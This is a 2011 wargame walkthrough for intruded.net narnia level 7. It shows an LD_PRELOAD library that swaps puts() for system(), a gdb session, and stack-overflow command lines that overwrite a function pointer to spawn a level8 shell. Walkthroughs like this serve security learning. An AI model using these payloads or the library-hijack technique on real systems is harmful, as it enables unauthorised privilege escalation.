Title: intruded.net, narnia: level 7
Date: 2011/09/25 00:32
Tags: intruded.net, narnia, x86, gdb, stack, LD_PRELOAD, shared library
Author: Ken Ko
Category: tutorials

I feel like a GOT/PLT redirect for this one.

[codebox 1]

Not sure how this will go, though, because even though we have the makings of a return-to-libc with the 2 strcpy() calls and the function pointer--there isn't a system() call that was compiled into the binary. The PLT only has useless functions such as printf(), seteuid(), etc.--nothing to spawn a shell.


So if we can't overwrite the address of the pointer to a local system() call, let's overwrite the puts() function entirely.

<code>
level7@narnia:/tmp$ cat puts-system.c
#include <stdlib.h>

int puts(char *s)
{
        system (s);
}
level7@narnia:/tmp$ gcc -fPIC -shared -o puts-system.so puts-system.c
level7@narnia:/tmp$
</code>

The <strong>-fPIC</strong> is required when creating a <em>shared</em> library because we need gcc to give us position-independent-code. That should explain the gcc parameters. 

Alright, let's create a test program to see if this even works for the simplest case:

<code>
level7@narnia:/tmp$ cat puts.c
#include <stdlib.h>

int main () {
        puts("/bin/sh");
}
level7@narnia:/tmp$ gcc puts.c
level7@narnia:/tmp$ LD_PRELOAD="./puts-system.so" ./a.out
sh-3.1$ 
</code>

<em>Nice.</em>

Will this naive approach work with the level7 binary?

<code>
level7@narnia:/tmp$ LD_PRELOAD="./puts-system.so" /wargame/level7 \"/bin/sh\" hi
"/bin/sh"
</code>

Nope. Not at all. What does gdb have to say about this?

<code>
level7@narnia:/tmp$ LD_PRELOAD="./puts-system.so" gdb -q /wargame/level7
Using host libthread_db library "/lib/tls/i686/cmov/libthread_db.so.1".
(gdb) b system
Function "system" not defined.
Make breakpoint pending on future shared library load? (y or [n]) y

Breakpoint 1 (system) pending.
(gdb) r hi hi
Starting program: /wargame/level7 hi hi
Error in re-setting breakpoint 2:
Function "system" not defined.

Breakpoint 2, 0xb7ee5990 in system () from /lib/tls/i686/cmov/libc.so.6
(gdb) i r
eax            0xbffffa18       -1073743336
ecx            0x1      1
edx            0xffffffff       -1
ebx            0xb7fe7650       -1208060336
esp            0xbffff9dc       0xbffff9dc
ebp            0xbffff9e8       0xbffff9e8
esi            0x0      0
edi            0xb8000cc0       -1207956288
eip            0xb7ee5990       0xb7ee5990 <system>
eflags         0x246    [ PF ZF IF ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
(gdb)
</code>

Indeed, the system() call is on the stack; but it looks like the address of system() starts with 0xb7 while the code is checking for 0xbf to be the leading byte. Of course, then, we never reach the desired code path. 

So now the issue is that we need system() to be local to the stack, with a 0xbf address. Let's use gdb to try and solve this issue:

<code>
(gdb) disas main
Dump of assembler code for function main:
. . .
0x0804862c <main+312>:  mov    0xfffffffc(%ebp),%eax
0x0804862f <main+315>:  and    $0xff000000,%eax
0x08048634 <main+320>:  cmp    $0xbf000000,%eax
0x08048639 <main+325>:  jne    0x8048647 <main+339>
. . .
(gdb) b *0x0804862f 
. . .
(gdb) r hi `python -c 'print "A"*8 + "BBBBBBBB" + "\x90\x59\xee\xb7"*2'`
. . .
Breakpoint 3, 0x0804862f in main ()
(gdb) i r
eax            0xb7ee5990       -1209116272
. . .
sh: BBBBBBBBYî·Yî·: command not found
</code>

Looks like we have eax pointing, now, to our system() call. This is progress! Even better, we see that the system() call is trying to execute the contents of buffer b1. Once we make this call a /bin/sh, we should be victorious. 

The buffers are all 8 bytes white, so we should count:

/bin/sh <-- 7 characters
So what we want is "/bin/sh " <-- note the extra space at the end. We can't null terminate the string because then strcpy will stop copying!

<code>
int *fp, i;
char b1, b2;
</code>

That's the order of the variable declarations, so the stack should look something like this:

[codebox 2]

The values we want:

<code>
b2: don't care
b1: /bin/sh
i: don't care
fp: system()
</code>

Give this a shot:

<code>
level7@narnia:/tmp$ LD_PRELOAD="./puts-system.so" /wargame/level7 hi `python -c 'print "A"*8 + "/bin/sh " + "#" * 4 + "\x90\x89\xee\xb7"'`
/wargame/level7 b1 b2
</code>

Looks like the binary doesn't recognize one of the parameters--most likely our python call--because it's spitting out the usage help. Try it again, but with quotations around:

<code>
level7@narnia:/tmp$ LD_PRELOAD="./puts-system.so" /wargame/level7 hi "`python -c 'print "A"*8 + "/bin/sh " + "#" * 4 + "\x90\x89\xee\xb7"'`"
sh-3.1$ whoami
level8
</code>

Awesome possum. Being able to overwrite functions with our own definitions using the linker is pretty cool.

What we now have:

<code>
b2: AAAAAAAA
b1: /bin/sh
i: ####
fp: system()
</code>

Final level!
